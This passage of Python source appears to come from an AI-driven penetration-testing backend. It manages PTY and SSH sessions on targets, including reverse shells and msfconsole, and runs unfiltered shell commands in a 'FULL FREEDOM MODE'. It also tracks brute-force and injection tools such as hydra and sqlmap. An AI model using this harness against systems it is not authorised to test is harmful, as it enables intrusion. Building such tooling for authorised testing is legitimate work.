        self.master_fd    = None
        self._proc        = None   # asyncio.subprocess.Process
        self.pid          = None
        self.alive        = False
        self._buf         = asyncio.Queue(maxsize=10000)
        self._pump_task   = None
        self._last_cmd    = ""     # Track last sent command for echo stripping
        self.created_at   = time.monotonic()
        # Session metadata for AI reasoning
        self.metadata: Dict[str, Any] = {
            "exploit":    None,       # e.g. "vsftpd_234_backdoor"
            "is_root":    None,       # True/False/None (unknown)
            "target_host": target,    # e.g. "10.10.10.5"
            "shell_type": "",         # "reverse", "bind", "meterpreter", "direct"
        }

    async def start(self, command: List[str]):
        """
        Create a PTY master/slave pair and launch the command as a subprocess
        with the slave as its controlling terminal.

        WHY NOT pty.fork() + run_in_executor:
          pty.fork() calls os.fork() from a thread-pool thread.  After the fork,
          the child inherits the parent's (broken) asyncio event loop — all other
          threads are gone, internal pipes/epoll-fds are in an inconsistent state.
          The child's 'await run_in_executor' future can never resolve because
          loop.call_soon_threadsafe() writes to a dead wakeup pipe.  As a result
          os.execvp() is NEVER called, no process runs, and the master fd
          produces zero output — which is exactly the empty-session bug.

        FIX: use pty.openpty() (no fork) + asyncio.create_subprocess_exec
             (safe async subprocess creation).
        """
        # Step 1 — open PTY pair (no forking yet)
        self.master_fd, slave_fd = pty.openpty()

        # Step 2 — give the slave a sensible terminal size
        try:
            import struct, termios as _termios
            winsize = struct.pack('HHHH', 50, 500, 0, 0)
            fcntl.ioctl(slave_fd, _termios.TIOCSWINSZ, winsize)
        except Exception:
            pass

        # BUG-006 FIX: Replace unsafe preexec_fn with start_new_session=True
        # and attach controlling terminal via a wrapper script approach.
        # Step 3 — wrapper: setsid + TIOCSCTTY in the child
        # We use a tiny shell wrapper that calls setsid and execs the real command.
        # This avoids preexec_fn which is unsafe with asyncio subprocess.
        wrapper_script = (
            f"import os, fcntl, termios; "
            f"os.setsid(); "
            f"fcntl.ioctl(0, termios.TIOCSCTTY, 0); "
            f"os.execvp({command[0]!r}, {command!r})"
        )

        # Step 4 — launch via asyncio (safe, no fork-in-thread, no preexec_fn)
        try:
            self._proc = await asyncio.create_subprocess_exec(
                sys.executable, "-c", wrapper_script,
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
            )
        except BaseException:
            # FIX: never leak the PTY pair when subprocess creation itself fails
            try:
                os.close(slave_fd)
            except OSError:
                pass
            if self.master_fd is not None:
                try:
                    os.close(self.master_fd)
                except OSError:
                    pass
                self.master_fd = None
            raise
        # BUG-008 FIX: Always close slave_fd in parent, even on exception
        try:
            os.close(slave_fd)
        except OSError:
            pass

        self.pid   = self._proc.pid
        self.alive = True

        # Step 5 — make master non-blocking for async reads
        flags = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
        fcntl.fcntl(self.master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

        # Step 6 — start the async pump task
        self._pump_task = asyncio.create_task(self._pump_stdout())
        logger.info(f"PTY session {self.session_id} started (pid={self.pid}) cmd={command}")

        # FIX: surface immediate exec failure (e.g. missing binary) — without
        # this the session reports 'started' and dies silently moments later.
        await asyncio.sleep(0.1)
        if self._proc.returncode is not None:
            self.alive = False
            raise RuntimeError(
                f"Command failed to start (exit {self._proc.returncode}): {command[0]} not found or not executable")

    async def _pump_stdout(self):
        """
        Push PTY output into self._buf using loop.add_reader() (epoll-backed).
        BUG-002 FIX: Register reader once, unregister only on exit.
        Avoids add_reader/remove_reader every iteration which can lose events.
        """
        loop = asyncio.get_running_loop()
        data_ready = asyncio.Event()

        try:
            loop.add_reader(self.master_fd, data_ready.set)
        except Exception:
            logger.error(f"Failed to add reader for session {self.session_id}")
            return

        try:
            while self.alive:
                data_ready.clear()
                try:
                    await asyncio.wait_for(data_ready.wait(), timeout=1.0)
                except asyncio.TimeoutError:
                    if self._proc.returncode is not None:
                        self.alive = False
                        break
                    # Drain any data that might have arrived without triggering the event
                    # (race between remove and re-add in old code)
                    chunks = self._drain_fd()
                    if chunks:
                        await self._enqueue_chunks(chunks)
                    continue

                # Drain all bytes currently buffered in the PTY
                chunks = self._drain_fd()
                if chunks:
                    await self._enqueue_chunks(chunks)
        finally:
            try:
                loop.remove_reader(self.master_fd)
            except Exception:
                pass
            # FIX6: close the master fd — the old finally only removed the
            # reader, leaking one fd + a zombie dict entry per dead session
            # (nc -w expiry, dropped reverse shells). ~200 dead sessions =
            # fd exhaustion. The fd may already be closed by OSError paths —
            # guard with OSError.
            try:
                os.close(self.master_fd)
            except OSError:
                pass
            self.alive = False

        logger.info(f"PTY pump stopped for session {self.session_id}")

    def _drain_fd(self) -> List[bytes]:
        """Non-blocking drain of master_fd. Returns list of byte chunks."""
        chunks: List[bytes] = []
        try:
            while True:
                raw = os.read(self.master_fd, 65536)
                if not raw:
                    break
                chunks.append(raw)
        except BlockingIOError:
            pass
        except OSError:
            self.alive = False
            # FIX6b: the fd is dead — close it now; the pump finally's
            # os.close is guarded against double-close
            try:
                os.close(self.master_fd)
            except OSError:
                pass
        return chunks

    async def _enqueue_chunks(self, chunks: List[bytes]):
        """Strip ANSI and enqueue cleaned text chunks.
        FIX: drop-oldest when full — a blocked put() stalls the pump, the
        kernel PTY buffer fills and the target process hangs on write; a
        never-read session (e.g. the prewarmed msfconsole) would otherwise
        grow the queue without bound."""
        text = b"".join(chunks).decode("utf-8", errors="replace")
        clean = _strip_ansi(text)
        if clean:
            # FIX7: byte-bound the queue — 10k items x 64KB chunks = ~640MB
            # per session (cat /dev/urandom in a session OOM'd the box).
            # Truncate each chunk to 8KB; drop-oldest still applies.
            if len(clean) > 8192:
                clean = clean[-8192:]
            while self._buf.full():
                try:
                    self._buf.get_nowait()
                except asyncio.QueueEmpty:
                    break
            try:
                self._buf.put_nowait(clean)
            except asyncio.QueueFull:
                pass

    async def send(self, data: str, newline: bool = True, strip_echo: bool = True):
        """Write a command to the PTY master fd.
        BUG-021 FIX: Track last command for echo stripping in read().
        FIX: loop on os.write until ALL bytes are sent — a non-blocking fd can
        return short counts (partial writes) that previously dropped command
        bytes silently when the PTY buffer was full."""
        if not self.alive:
            raise RuntimeError("Session is not alive")
        payload = (data + "\n" if newline else data).encode()
        loop = asyncio.get_running_loop()

        def _write_all() -> None:
            view = memoryview(payload)
            n = 0
            while n < len(view):
                try:
                    n += os.write(self.master_fd, view[n:])
                except BlockingIOError:
                    time.sleep(0.01)
                except OSError:
                    # PTY master EIO: the slave/child side closed — treat the
                    # session as dead instead of crashing the request with a 500
                    self.alive = False
                    raise RuntimeError("PTY session died (target process closed)")

        await asyncio.wait_for(loop.run_in_executor(None, _write_all), timeout=30.0)
        self._last_cmd = data  # Track for echo stripping (only after a full write)

    async def read(self, timeout: float = 5.0, wait_for: Optional[str] = None,
                   strip_echo: bool = True) -> str:
        """
        Drain the output buffer.
        - If wait_for is set: keep reading until that string appears in the
          accumulated output, or until `timeout` seconds have elapsed.
        - If wait_for is not set: return once the output has been idle for
          IDLE_GAP seconds (or the full timeout elapses).
        - strip_echo: remove the echoed command from the beginning of output.
        """
        IDLE_GAP   = 0.4
        POLL_TICK  = 0.08
        acc = ""
        loop = asyncio.get_running_loop()
        deadline  = loop.time() + timeout
        idle_since: Optional[float] = None

        while loop.time() < deadline:
            try:
                chunk = await asyncio.wait_for(self._buf.get(), timeout=POLL_TICK)
                acc += chunk  # FIX: accumulator — joining chunks per-iteration was O(n²)
                idle_since = None
                if wait_for and wait_for in acc:
                    break
            except asyncio.TimeoutError:
                if not wait_for and acc:
                    if idle_since is None:
                        idle_since = loop.time()
                    elif loop.time() - idle_since >= IDLE_GAP:
                        break
        result = acc
        # BUG-021: Strip command echo from output
        # PTY typically echoes: cmd\r\n  (after _strip_ansi normalizes → cmd\n)
        # Some raw PTYs echo: cmd\r\n or just cmd\r or cmd\n
        if strip_echo and self._last_cmd:
            # FIX: msfconsole echoes as "msf6 exploit(...) > use x" — strip a
            # leading prompt prefix first so echo-stripping can match.
            pm = re.match(r'^msf6[^\n]*>\s*', result)
            if pm:
                result = result[pm.end():]
            for sep in ("\n", "\r\n", "\r"):
                echo_pattern = self._last_cmd + sep
                if result.startswith(echo_pattern):
                    result = result[len(echo_pattern):]
                    break
            else:
                # Fallback: strip just the command text if it's at the start
                if result.startswith(self._last_cmd):
                    result = result[len(self._last_cmd):]
                    # Also strip the trailing newline/cr that follows
                    if result.startswith("\n"):
                        result = result[1:]
                    elif result.startswith("\r\n"):
                        result = result[2:]
                    elif result.startswith("\r"):
                        result = result[1:]
        return result

    async def kill(self):
        """Terminate the PTY process tree cleanly: SIGTERM → SIGKILL, then reap.
        FIX: kills the whole process group (child is a setsid leader, so its
        grandchildren die too) and waits for the zombie instead of leaking it."""
        self.alive = False
        if self._pump_task:
            self._pump_task.cancel()
            try:
                await self._pump_task
            except asyncio.CancelledError:
                pass
        if self._proc and self._proc.returncode is None:
            pid = self._proc.pid
            try:
                try:
                    os.killpg(os.getpgid(pid), signal.SIGTERM)
                except (ProcessLookupError, PermissionError):
                    try:
                        self._proc.terminate()
                    except ProcessLookupError:
                        pass
                try:
                    await asyncio.wait_for(self._proc.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    try:
                        os.killpg(os.getpgid(pid), signal.SIGKILL)
                    except (ProcessLookupError, PermissionError):
                        pass
                    try:
                        self._proc.kill()
                    except ProcessLookupError:
                        pass
                    try:
                        await asyncio.wait_for(self._proc.wait(), timeout=2.0)
                    except Exception:
                        pass
            except Exception:
                pass
        if self.master_fd is not None:
            try:
                os.close(self.master_fd)
            except OSError:
                pass
            self.master_fd = None
        logger.info(f"PTY session {self.session_id} killed")


# ─────────────────────────────────────────────
# SSH Session Manager (via asyncssh)
# ─────────────────────────────────────────────
class SSHSession:
    """Persistent SSH connection using asyncssh."""

    def __init__(self, session_id: str, host: str, port: int = 22):
        self.session_id = session_id
        self.host       = host
        self.port       = port
        self.conn       = None
        self.alive      = False

    async def connect(self, username: str, password: str = "", key_path: str = ""):
        """Establish SSH connection."""
        connect_kwargs: Dict[str, Any] = {
            "host":               self.host,
            "port":               self.port,
            "username":           username,
            "known_hosts":        None,  # CTF: skip host key verification
            "connect_timeout":    15,
        }
        if password:
            connect_kwargs["password"] = password
        if key_path and os.path.exists(key_path):
            connect_kwargs["client_keys"] = [key_path]

        self.conn = await asyncssh.connect(**connect_kwargs)
        self.alive = True
        logger.info(f"SSH session {self.session_id} connected to {self.host}:{self.port}")

    async def exec(self, command: str, timeout: float = 30.0) -> Dict[str, Any]:
        """Execute a command in the SSH session and return structured result."""
        if not self.alive or not self.conn:
            raise RuntimeError("SSH session not connected")
        try:
            result = await asyncio.wait_for(
                self.conn.run(command, check=False),
                timeout=timeout
            )
            return {
                "stdout":      result.stdout,
                "stderr":      result.stderr,
                "exit_code":   result.exit_status,
                "success":     result.exit_status == 0,
            }
        except asyncio.TimeoutError:
            return {"stdout": "", "stderr": "Command timed out", "exit_code": -1, "success": False}

    async def exec_interactive(self, commands: List[str], delay: float = 0.5) -> str:
        """
        Run a sequence of commands on an interactive PTY channel.
        Useful for su, sudo, passwd, expect-style interactions.
        FIX: drains stdout continuously — communicate() only returned output
        after the channel EOF'd, losing everything if the shell stayed open.
        """
        if not self.alive or not self.conn:
            raise RuntimeError("SSH session not connected")
        output_chunks = []
        async with self.conn.create_process(request_pty=True, term_type="xterm") as proc:
            async def _reader():
                while True:
                    try:
                        chunk = await asyncio.wait_for(proc.stdout.read(65536), timeout=2.0)
                    except (asyncio.TimeoutError, asyncssh.ChannelOpenError):
                        return
                    if not chunk:
                        return
                    output_chunks.append(chunk)

            reader_task = asyncio.create_task(_reader())
            for cmd in commands:
                proc.stdin.write(cmd + "\n")
                await asyncio.sleep(delay)
            # Give last command time to run
            await asyncio.sleep(1.0)
            try:
                proc.stdin.write("exit\n")
                await asyncio.sleep(2.0)
                proc.stdin.write_eof()
            except Exception:
                pass
            try:
                await asyncio.wait_for(reader_task, timeout=5.0)
            except asyncio.TimeoutError:
                reader_task.cancel()
            try:
                await asyncio.wait_for(proc.wait(), timeout=2.0)
            except Exception:
                pass
        return "".join(output_chunks)

    async def upload_file(self, local_path: str, remote_path: str):
        """Upload a file over SFTP."""
        async with self.conn.start_sftp_client() as sftp:
            await sftp.put(local_path, remote_path)

    async def download_file(self, remote_path: str, local_path: str):
        """Download a file over SFTP."""
        async with self.conn.start_sftp_client() as sftp:
            await sftp.get(remote_path, local_path)

    async def close(self):
        self.alive = False
        if self.conn:
            self.conn.close()
            await self.conn.wait_closed()
        logger.info(f"SSH session {self.session_id} closed")


# ─────────────────────────────────────────────
# Session registry (in-memory)
# ─────────────────────────────────────────────
_pty_sessions:  Dict[str, PTYSession]  = {}
_ssh_sessions:  Dict[str, SSHSession]  = {}
_db = FindingsDB()


# ─────────────────────────────────────────────
# Async command runner (non-interactive)
# ─────────────────────────────────────────────
async def run_command(command: str, timeout: int = CMD_TIMEOUT) -> Dict[str, Any]:
    """Run a shell command asynchronously and return structured output.
    FULL FREEDOM MODE: no shell metacharacter filtering — all commands pass
    through (;, |, $(), backticks, chained commands, etc.).

    FIX: process-group isolation — on timeout the WHOLE group (shell + children
    like hydra/hashcat) is SIGKILLed and the pipe drain is bounded, so a child
    holding stdout open can never hang the endpoint. Cancellation (e.g. the
    /api/parallel timeout path) also reaps the process instead of leaking it.
    """
    start = time.monotonic()
    logger.debug(f"CMD: {_redact(command)}")

    # FIX12b: strip ADARA_TOKEN from foreground children too — the
    # background path (JobTracker.start) was covered, but /api/command and
    # every tool subprocess here still inherited the token into
    # /proc/<pid>/environ
    env = None
    if "ADARA_TOKEN" in os.environ:
        env = {k: v for k, v in os.environ.items() if k != "ADARA_TOKEN"}

    proc = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        env=env,
        start_new_session=True,  # own process group -> children die with it
    )

    def _kill_group(sig):
        try:
            os.killpg(os.getpgid(proc.pid), sig)
        except (ProcessLookupError, PermissionError):
            pass
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    try:
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            _kill_group(signal.SIGKILL)
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            except asyncio.TimeoutError:
                for pipe in (proc.stdout, proc.stderr):
                    if pipe:
                        try:
                            pipe.close()
                        except Exception:
                            pass
                stdout, stderr = b"", b""
            elapsed = time.monotonic() - start
            out_str = _strip_ansi(stdout.decode("utf-8", errors="replace"))
            err_str = _strip_ansi(stderr.decode("utf-8", errors="replace"))
            # FIX: surface what WAS running when the timeout hit — last non-empty
            # stdout lines + a parsed progress hint (sqlmap char X/Y, ffuf %, etc.)
            last_lines = [l for l in out_str.splitlines() if l.strip()][-10:]
            return {
                "stdout":       out_str,
                "stderr":       err_str,
                "return_code":  -1,
                "success":      False,   # FIX: was bool(stdout) — partial output is NOT success
                "timed_out":    True,
                "elapsed_sec":  round(elapsed, 2),
                "partial_results": bool(stdout),
                "last_lines":   last_lines,
                "progress":     (_parse_progress(_detect_track(command), out_str) or ["no output captured"])[0],
                "diagnostic":   "timed_out_with_partial" if stdout else "timed_out_no_output",
            }

        elapsed = time.monotonic() - start
        return {
            "stdout":       _strip_ansi(stdout.decode("utf-8", errors="replace")),
            "stderr":       _strip_ansi(stderr.decode("utf-8", errors="replace")),
            "return_code":  proc.returncode,
            "success":      proc.returncode == 0,
            "timed_out":    False,
            "elapsed_sec":  round(elapsed, 2),
        }
    except Exception as e:
        _kill_group(signal.SIGKILL)
        return {"stdout": "", "stderr": str(e), "return_code": -1, "success": False, "timed_out": False, "elapsed_sec": 0}
    except BaseException:
        # CancelledError (or fatal) — never leak the subprocess or its children
        _kill_group(signal.SIGKILL)
        raise


# ─────────────────────────────────────────────
# Auto-background runner — fixes MCP -32001 timeouts at the source
# Tool endpoints used to block on run_command() for up to 3600s; the MCP
# client cancels the whole tool call well before that (~300s), giving us the
# -32001 'Request timed out' spam.
#
# Now every long-running tool goes through the SAME JobTracker backend as the
# background=True path. It gets a short *sync preview budget* (AUTO_BG_GRACE)
# to finish inline. If it's still running when the budget expires, the SAME
# process keeps running as a detached job and we return its job_id (exactly
# like background=True) — nothing is killed, restarted or wasted, and the MCP
# call always returns within ~budget seconds. The caller then polls
# scan_status / blocks with scan_wait, or simply moves on to the next task.
# ─────────────────────────────────────────────

async def _read_full_log(log_path: str, cap: int = 4 * 1024 * 1024):
    """Read an entire job log file up to `cap` bytes.
    Returns (text, truncated). Fast tools (nmap XML, gobuster paths) need the
    FULL stdout so the handlers can parse/regex it — a windowed read would
    silently lose the ports/paths they extract."""
    try:
        with open(log_path, "rb") as f:
            data = f.read(cap + 1).decode("utf-8", errors="replace")
        if len(data) > cap:
            return data[:cap] + f"\n...[trimmed (> {cap // (1024 * 1024)}MiB log)]...", True
        return data, False
    except FileNotFoundError:
        return "", False
    except Exception as e:
        return f"[error reading log: {e}]", False


async def _job_to_result(job_id: str, st: Dict[str, Any], log_path: str) -> Dict[str, Any]:
    """Convert a finished JobTracker status into a run_command()-shaped dict so
    tool handlers can reuse their existing post-processing unchanged."""
    stdout, truncated = await _read_full_log(log_path)
    exit_code = st.get("exit_code")
    res: Dict[str, Any] = {
        "stdout":        _strip_ansi(stdout),
        "stderr":        "",
        "return_code":   exit_code if exit_code is not None else -1,
        "success":       exit_code == 0,
        "timed_out":     False,
        "elapsed_sec":   st.get("elapsed_sec") or 0,
        "job_id":        job_id,
        "delivered":     "async_fast",
        "stdout_len":    len(stdout),
    }
    if truncated:
        res["stdout_truncated"] = True
    return res


async def _run_or_background(command: str, track: str = "",
                             budget: Optional[float] = None) -> Dict[str, Any]:
    """Launch a tool command with a short sync preview; auto-detach if slow.
    Returns EITHER a finished run_command()-shaped result OR (when it outlived
    the budget) the background-job payload with auto_backgrounded=True."""
    budget = AUTO_BG_GRACE if budget is None else max(float(budget), 2.0)
    bg = await start_background_job(command, track=track)
    if not bg.get("started"):
        # Job cap reached / failed to launch — shape it like a tool result so
        # every handler's `if result["stdout"]:` indexing can't KeyError.
        return {
            **bg,
            "stdout":       "",
            "stderr":       bg.get("error") or bg.get("message") or "job not started",
            "return_code":  -1,
            "success":      False,
            "timed_out":    False,
            "elapsed_sec":  0,
            "started":      False,
        }
    job_id = bg["job_id"]
    tracker = _jobs.get(job_id)
    deadline = time.monotonic() + budget
    last: Dict[str, Any] = {}
    while time.monotonic() < deadline:
        try:
            last = await tracker.status() if tracker else {}
        except Exception:
            last = {}
        if last.get("finished"):
            try:
                return await _job_to_result(job_id, last, bg.get("log_path", ""))
            except Exception:
                pass
            break
        await asyncio.sleep(0.25)
    # Budget expired — the job keeps running detached. Hand back the job_id.
    payload = {
        **bg,
        "auto_backgrounded": True,
        "auto_bg_grace_sec": round(budget, 2),
        "message": f"Still running after the {round(budget)}s sync preview — "
                   f"detached. Poll /api/scan/{job_id}/status or block with "
                   f"/api/scan/{job_id}/wait.",
        "tip": f"Call scan_wait('{job_id}') to block until this job finishes.",
    }
    if last:
        payload["progress"] = last.get("progress", "no output yet")
        payload["tail"] = (last.get("tail") or "")[-1200:]
    return payload


def _ports_from_nmap_text(text: str):
    """Parse 'PORT/PROTO open SERVICE' lines from nmap HUMAN output.
    FIX (M3): nmap pads columns with multiple spaces and can inject
    whitespace mid-entry — collapse run of spaces first so the regex matches
    regardless of spacing. Returns (port:int, proto, service)."""
    out = []
    for line in (text or "").splitlines():
        collapsed = re.sub(r"\s+", " ", line.strip())
        m = re.search(r"(\d+)\s*/\s*(\w+)\s+open(?:\s+([^\s]+))?", collapsed)
        if m:
            try:
                out.append((int(m.group(1)), m.group(2), m.group(3) or ""))
            except ValueError:
                continue
    return out


def _nmap_text_services_with_versions(text: str) -> List[Dict[str, Any]]:
    """Parse open SERVICE lines from nmap HUMAN (-sV) output into
    {port, proto, service, product, version}. Version extraction is
    best-effort: the tail after 'SERVICE' is split at the first token
    containing a digit (e.g. 'OpenSSH 8.2p1 Ubuntu 4.0' -> product
    OpenSSH, version '8.2p1 Ubuntu'); parenthetical extra-info is
    dropped. Lines without a version yield product/version '' and are
    skipped by the auto-CVE lookup."""
    out: List[Dict[str, Any]] = []
    for line in (text or "").splitlines():
        collapsed = re.sub(r"\s+", " ", line.strip())
        m = re.search(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?$", collapsed)
        if not m:
            continue
        tail = (m.group(4) or "").strip()
        tail = re.sub(r"\s*\(.*$", "", tail).strip()
        product = ""
        version = ""
        if tail:
            toks = tail.split()
            vi = next((i for i, t in enumerate(toks) if re.search(r"\d", t)), None)
            if vi is not None:
                product = " ".join(toks[:vi])
                # version = consecutive tokens starting with a digit
                # ('8.2p1' — drop trailing 'Ubuntu 4ubuntu0.3' noise so CPE
                # lookups actually match NVD ranges)
                vrun = []
                for t in toks[vi:]:
                    if re.match(r"^[0-9][\w.\-+]*$", t):
                        vrun.append(t)
                    else:
                        break
                version = " ".join(vrun) or " ".join(toks[vi:vi + 2])
        try:
            out.append({
                "port": int(m.group(1)),
                "proto": m.group(2),
                "service": m.group(3),
                "product": product,
                "version": version,
            })
        except ValueError:
            continue
    return out


def _ports_from_nmap_xml_text(xml_text: str) -> List[Dict[str, Any]]:
    r"""Whitespace-tolerant regex extraction from nmap XML when ET parsing fails.
    The real nmap log is one XML entry per line with newlines *inside* tags —
    a plain regex like r'(\d+)/(\w+)\s+open\s+(\S+)' matches human output, not
    XML, and returns empty. Normalize collapses them (the user's exact report:
    'regex may not match due to whitespace'). Best effort — returns [] if the
    XML is too mangled to salvage."""
    norm = re.sub(r">\s+<", "><", re.sub(r"\s+", " ", xml_text or ""))
    out: List[Dict[str, Any]] = []
    for chunk in norm.split("<port ")[1:]:
        m = re.search(r'protocol="(\w+)"\s+portid="(\d+)"', chunk)
        if not m:
            continue
        if 'state="open"' not in chunk:
            continue
        svc_tag = re.search(r"<service\s+([^>]*?)[/?>]", chunk)
        attrs: Dict[str, str] = {}
        if svc_tag:
            attrs = dict(re.findall(r'([\w:-]+)="([^"]*)"', svc_tag.group(1)))
        try:
            out.append({
                "port": int(m.group(2)),
                "proto": m.group(1),
                "service": attrs.get("name", ""),
                "product": attrs.get("product", ""),
                "version": attrs.get("version", ""),
                "cpe": attrs.get("cpe", ""),
            })
        except ValueError:
            continue
    out.sort(key=lambda p: p["port"])
    return out


# ─────────────────────────────────────────────
# Background Job Tracker — runs long scans detached, never blocks MCP
# ─────────────────────────────────────────────

def _detect_track(command: str) -> str:
    """Auto-detect which tool a command is running, for progress parsing.
    FIX: skips command wrappers (timeout/sudo/nohup), flags, URLs and
    key=value tokens so the real binary is found — e.g. 'timeout 300 hydra …'
    now correctly tracks 'hydra'."""
    WRAPPERS = {"timeout", "sudo", "nohup", "nice", "env", "setsid",
                "bash", "sh", "zsh", "python", "python3"}
    if not command:
        return ""
    c = command.strip().split()
    if not c:
        return ""
    for tok in c:
        if tok.startswith("-") or "=" in tok or "://" in tok:
            continue
        base = os.path.basename(tok)
        if base in WRAPPERS:
            continue
        if base in ("sqlmap", "ffuf", "gobuster", "hydra", "nuclei",
                    "nmap", "nikto", "wpscan", "dirb", "wfuzz", "masscan"):
            return base
        return base
    return ""


def _parse_progress(track: str, text: str) -> List[str]:
    """Parse tool-specific progress hints from captured output text.
    Returns a list of human-readable progress strings (most specific first).
    Used by both JobTracker.status() and run_command() timeout diagnostics."""
    if not text:
        return ["no output captured"]
    out: List[str] = []
    t = (track or "").lower()

    # sqlmap blind extraction: "char X/Y" + "retrieved: <hex>"
    if t == "sqlmap":
        chars = re.findall(r'char (\d+)/(\d+)', text)
        retrieved = re.findall(r'retrieved: (\S+)', text)
        if chars:
            last = chars[-1]
            extra = f", last='{retrieved[-1]}'" if retrieved else ""
            out.append(f"sqlmap: char {last[0]}/{last[1]} blind extraction{extra}")
        pct = re.findall(r'(\d+(?:\.\d+)?)%', text)
        if pct:
            out.append(f"sqlmap: {pct[-1]}%")
        testing = re.findall(r'testing (\d+) payloads', text)
        if testing:
            out.append(f"sqlmap: testing {testing[-1]} payloads")

    # ffuf: "Progress: [5234/10432] ·· 50.2%"
    elif t == "ffuf":
        m = re.findall(r'Progress:\s*\[(\d+)/(\d+)\].*?([\d.]+)%', text)
        if m:
            last = m[-1]
            out.append(f"ffuf: {last[0]}/{last[1]} ({last[2]}%)")

    # gobuster: count "Found:" / "Status: 200"
    elif t == "gobuster":
        found = len(re.findall(r'^Found:', text, re.MULTILINE))
        if found:
            out.append(f"gobuster: {found} dirs/files found")

    # hydra: "[ATTEMPT] target -L - 842/1432"
    elif t == "hydra":
        m = re.findall(r'\[ATTEMPT\].*?-\s*(\d+)/(\d+)', text)
        if m:
            last = m[-1]
            out.append(f"hydra: {last[0]}/{last[1]} attempts")

    # nuclei: count JSONL findings in log
    elif t == "nuclei":
        findings = sum(1 for l in text.splitlines()
                       if l.strip().startswith("{") and '"template-id"' in l)
        if findings:
            out.append(f"nuclei: {findings} finding(s)")

    # Generic percentage fallback
    if not out:
        pct = re.findall(r'(\d+(?:\.\d+)?)%', text)
        if pct:
            out.append(f"{t or 'scan'}: {pct[-1]}%")

    # Final fallback: last non-empty line
    if not out:
        last_line = next((l.strip() for l in reversed(text.splitlines()) if l.strip()), "")
        if last_line:
            out.append(f"{t or 'scan'}: {last_line[:80]}")
        else:
            out.append("no progress markers found")
    return out


class JobTracker:
    """A detached background scan job. stdout/stderr → log file; never blocks.

    Why this exists: sqlmap --level=3 / ffuf on big wordlists routinely exceed
    the 300s MCP timeout, producing -32001 'Request timeout'. By launching the
    scan detached with output redirected to a log file, scan_start() returns
    immediately, and scan_status()/scan_wait() let the caller poll progress
    without ever holding a single httpx call open past the MCP ceiling.
    """

    def __init__(self, job_id: str, command: str, log_path: str, track: str = ""):
        self.job_id    = job_id
        self.command   = command
        self.log_path  = log_path
        self.track     = track or _detect_track(command)
        self.proc: Optional[asyncio.subprocess.Process] = None
        self.pid: Optional[int] = None
        self.started_at = time.monotonic()
        self._alive = False

    async def start(self, env: Optional[Dict[str, str]] = None):
        """Launch the command detached, output → self.log_path."""
        # Open log file; line-buffered. stderr merged into stdout (2>&1).
        log_fh = open(self.log_path, "w", buffering=1)
        full_env = os.environ.copy()
        # FIX12: strip ADARA_TOKEN from subprocess env — children inherit the
        # whole environment, so any spawned tool could leak the API token via
        # /proc/<pid>/environ to local users
        full_env.pop("ADARA_TOKEN", None)
        if env:
            full_env.update({k: str(v) for k, v in env.items()})
        self.proc = await asyncio.create_subprocess_shell(
            self.command,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
            env=full_env,
            # Don't block on communicate() — fire and forget
            start_new_session=True,
        )
        # Child holds its own dup'd fd — close the parent's handle
        try:
            log_fh.close()
        except OSError:
            pass
        self.pid = self.proc.pid
        self._alive = True
        # Persist to DB for cross-restart durability — FIX5: redacted, the
        # jobs table must not hold `hydra -p secret` in plaintext
        await _db.save_job(self.job_id, _redact(self.command), self.log_path, self.track)
        # Background reaper: mark finished in DB when proc exits
        asyncio.create_task(self._reaper())
        logger.info(f"Job {self.job_id} started (pid={self.pid}) track={self.track} log={self.log_path}")
        return self

    async def _reaper(self):
        """Wait for proc to exit, update _alive and DB. Detached — never awaited."""
        if not self.proc:
            return
        try:
            rc = await self.proc.wait()
        except Exception:
            rc = -1
        self._alive = False
        await _db.finish_job(self.job_id, rc if rc is not None else -1)
        logger.info(f"Job {self.job_id} finished (exit={rc})")

    def _read_tail(self, tail_bytes: int = 4096) -> str:
        """Read the last tail_bytes of the log file, starting at a line boundary
        so multibyte UTF-8 / partial lines never corrupt the tail.
        FIX: only strip the partial first line when we actually seeked into the
        middle — small logs used to lose their only/first line entirely."""
        try:
            size = os.path.getsize(self.log_path)
            with open(self.log_path, "rb") as f:
                if size > tail_bytes:
                    f.seek(-tail_bytes, os.SEEK_END)
                    data = f.read().decode("utf-8", errors="replace")
                    nl = data.find("\n")
                    if nl != -1:
                        data = data[nl + 1:]
                else:
                    data = f.read().decode("utf-8", errors="replace")
            return data
        except FileNotFoundError:
            return ""
        except Exception as e:
            return f"[error reading log: {e}]"

    async def status(self, tail_bytes: int = 4096) -> Dict[str, Any]:
        tail_bytes = max(min(int(tail_bytes), 65536), 0)  # clamp — context-safety guard
        tail = self._read_tail(tail_bytes)
        # Determine alive: proc may have exited
        rc = None
        if self.proc is not None:
            rc = self.proc.returncode
        finished = rc is not None
        if self.proc is None and not self._alive:
            # DB ghost (reconstructed after restart, or killed) — derive from DB row
            db_row = await _db.get_job(self.job_id)
            rc = (db_row or {}).get("exit_code")
            finished = bool((db_row or {}).get("finished_at")) or rc is not None
        alive = self._alive and (rc is None) and not finished
        elapsed = round(time.monotonic() - self.started_at, 2)
        bytes_written = 0
        try:
            bytes_written = os.path.getsize(self.log_path)
        except OSError:
            pass
        progress_list = _parse_progress(self.track, tail)
        return {
            "job_id":         self.job_id,
            "alive":          alive,
            "exit_code":      rc,
            "elapsed_sec":    elapsed,
            "bytes_written":  bytes_written,
            "track":          self.track,
            "command":        _redact(self.command),  # FIX4b: status/wait/list leaked raw creds
            "log_path":       self.log_path,
            "tail":           tail,
            "progress":       progress_list[0] if progress_list else "no output yet",
            "progress_detail": {
                "all_hints": progress_list,
            },
            "finished":       finished,
        }

    async def read_full_output(self, head: int = 8000, tail: int = 6000) -> str:
        """Read the log windowed (head + tail) — scan_wait calls this on
        every finished job and a dirb -r / ffuf log can be multi-GB;
        slurping the whole file into memory per poll is a real DoS."""
        try:
            size = os.path.getsize(self.log_path)
            parts = []
            with open(self.log_path, "rb") as f:
                if size > head:
                    parts.append(f.read(head).decode("utf-8", errors="replace"))
                    f.seek(-tail, os.SEEK_END)
